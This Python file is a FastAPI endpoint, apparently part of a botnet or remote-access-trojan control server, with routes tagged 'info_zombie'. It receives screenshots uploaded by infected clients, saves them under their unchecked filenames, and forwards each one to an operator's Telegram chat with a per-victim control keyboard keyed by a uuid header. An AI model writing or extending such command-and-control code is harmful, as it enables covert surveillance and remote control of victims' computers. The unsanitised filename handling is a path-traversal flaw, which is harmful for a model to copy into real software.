from core.loader import bot, config
from bot.utils.text import control_text
from bot.keyb import control as control_keyboard_tg

from aiogram.types import FSInputFile
from fastapi import APIRouter, UploadFile, Request
from pathlib import Path

router_media=APIRouter(prefix='/media', tags=['info_zombie'])


@router_media.post('/upload_screenshot')
async def upload_screenshot(req: Request, file: UploadFile):
    print(1)
    contents = await file.read()
    path_photo = Path('screenshots') / file.filename
    path_photo.parent.mkdir(exist_ok=True)
    
    with open(str(path_photo), 'wb') as f:
        f.write(contents)
    
    headers = req.headers
    photo_file = FSInputFile(str(path_photo))
    
    await bot.send_photo(
        chat_id=config.admin_id_tg,
        photo=photo_file,
        caption=await control_text(headers),
        reply_markup=await control_keyboard_tg.control_main(headers["uuid"])
    )